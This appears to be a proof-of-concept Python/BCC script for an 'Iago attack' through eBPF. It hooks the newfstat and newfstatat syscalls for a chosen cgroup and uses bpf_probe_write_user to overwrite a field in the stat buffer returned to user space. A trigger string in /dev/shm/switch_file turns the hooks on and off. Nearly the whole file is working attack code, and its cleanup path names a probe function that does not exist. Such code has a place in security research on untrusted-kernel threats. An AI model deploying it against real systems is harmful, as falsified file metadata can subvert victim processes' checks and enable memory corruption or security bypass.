import os
import sys
import time
from bcc import BPF


if len(sys.argv) != 2:
    print("Usage: python3 script.py <target_cgroup_id>")
    sys.exit(1)

target_cgroup_id = int(sys.argv[1])
BPF_PROGRAM = f"""
#include <linux/fs.h>
#include <uapi/linux/ptrace.h>

struct addr {{
    void * dst;
}};

BPF_HASH(addr_poc, u32, struct addr);

static inline bool compare_cgroup_id(u64 cgroup_id) {{
    u64 current_cgroup_id = bpf_get_current_cgroup_id();
    if (cgroup_id != current_cgroup_id)
        return false;

    return true;
}}

long syscall__newfstatat(struct pt_regs *ctx, int dfd, const char __user *filename,
			       struct stat __user *statbuf, int flag)
{{
    char *target_comm = "test"; 
    char comm[TASK_COMM_LEN];
    struct addr addr_t = {{}};
    int key = 0;
    u64 target_cgroup = {target_cgroup_id};
    if (!compare_cgroup_id(target_cgroup))
        return 0;
    bpf_trace_printk("syscall__newfstatat 2");
    void *addr_s = (void *)statbuf;
    addr_t.dst = addr_s;
    addr_poc.update(&key, &addr_t);

EXIT:
    return 0;
}}
long syscall__newfstat(struct pt_regs *ctx, unsigned int fd, struct stat __user *statbuf)
{{
    struct addr addr_t = {{}};
    int key = 0;
    u64 target_cgroup = {target_cgroup_id};
    if (!compare_cgroup_id(target_cgroup))
        return 0;
    bpf_trace_printk("syscall__newfstat 2");
    void *addr_s = (void *)statbuf;
    addr_t.dst = addr_s;
    addr_poc.update(&key, &addr_t);

EXIT:
    return 0;
}}

long syscall__newfstatat_ret(struct pt_regs *ctx)
{{
    char *target_comm = "test"; 
    char comm[TASK_COMM_LEN];
    int key = 0;
    struct addr *addr_t;
    int index = 2;
    int content = 0;
    u64 success = -1;
    u64 target_cgroup = {target_cgroup_id};
    if (!compare_cgroup_id(target_cgroup))
        return 0;

    addr_t = addr_poc.lookup(&key);
    if(!addr_t)
        return 0;
    int ret = (int)PT_REGS_RC(ctx);
    if (ret < 0)
        goto EXIT;
    bpf_probe_read_user(&content, sizeof(content), (addr_t->dst + 48));
    bpf_trace_printk("content = %d", content);
 //   if (content == 19) 
    success = bpf_probe_write_user((addr_t->dst + 48), &index, sizeof(index));
    bpf_trace_printk("success = %d", success);
EXIT:
    return 0;
}}
"""


bpf = BPF(text=BPF_PROGRAM)


switch_file = "/dev/shm/switch_file"

if not os.path.exists(switch_file):
    with open(switch_file, "w") as f:
        f.write("")

print("eBPF program loaded. Monitoring /dev/shm/switch_file for commands...")
# bpf.attach_kprobe(event=bpf.get_syscall_fnname("newfstat"), fn_name="syscall__fstat_1")
# # bpf.attach_kprobe(event=bpf.get_syscall_fnname("fstat64"), fn_name="syscall__fstat_2")
# # bpf.attach_kprobe(event=bpf.get_syscall_fnname("fstatat64"), fn_name="syscall__fstat_3")
# bpf.attach_kprobe(event=bpf.get_syscall_fnname("fstat"), fn_name="syscall__fstat_4")
# bpf.attach_kprobe(event=bpf.get_syscall_fnname("fstatfs"), fn_name="syscall__fstat_5")
# bpf.attach_kprobe(event=bpf.get_syscall_fnname("fstatfs64"), fn_name="syscall__fstat_6")

try:
    attached = False 
    while True:
        with open(switch_file, "r") as f:
            content = f.read().strip()

        if content == "iago_attack_fstat" and not attached:
            print("Attaching kretprobe to fstat...")
            bpf.attach_kprobe(event=bpf.get_syscall_fnname("newfstatat"), fn_name="syscall__newfstatat")
            bpf.attach_kprobe(event=bpf.get_syscall_fnname("newfstat"), fn_name="syscall__newfstat")
            bpf.attach_kretprobe(event=bpf.get_syscall_fnname("newfstatat"), fn_name="syscall__newfstatat_ret")
            bpf.attach_kretprobe(event=bpf.get_syscall_fnname("newfstat"), fn_name="syscall__newfstatat_ret")
            attached = True

        elif content != "iago_attack_fstat" and attached:
            print("Detaching kretprobe from fstat...")
            bpf.detach_kprobe(event=bpf.get_syscall_fnname("newfstatat"), fn_name="syscall__newfstatat")
            bpf.detach_kprobe(event=bpf.get_syscall_fnname("newfstat"), fn_name="syscall__newfstat")
            bpf.detach_kretprobe(event=bpf.get_syscall_fnname("newfstatat"), fn_name="syscall__newfstatat_ret")
            bpf.detach_kretprobe(event=bpf.get_syscall_fnname("newfstat"), fn_name="syscall__newfstatat_ret")
            attached = False
        time.sleep(1)
except KeyboardInterrupt:
    if attached:
        bpf.detach_kprobe(event=bpf.get_syscall_fnname("newfstatat"), fn_name="syscall__newfstatat")
        bpf.detach_kprobe(event=bpf.get_syscall_fnname("newfstat"), fn_name="syscall__fstat")
        bpf.detach_kretprobe(event=bpf.get_syscall_fnname("newfstatat"), fn_name="syscall__newfstatat_ret")
        bpf.detach_kretprobe(event=bpf.get_syscall_fnname("newfstat"), fn_name="syscall__newfstatat_ret")
    print("Detaching probes and exiting...")
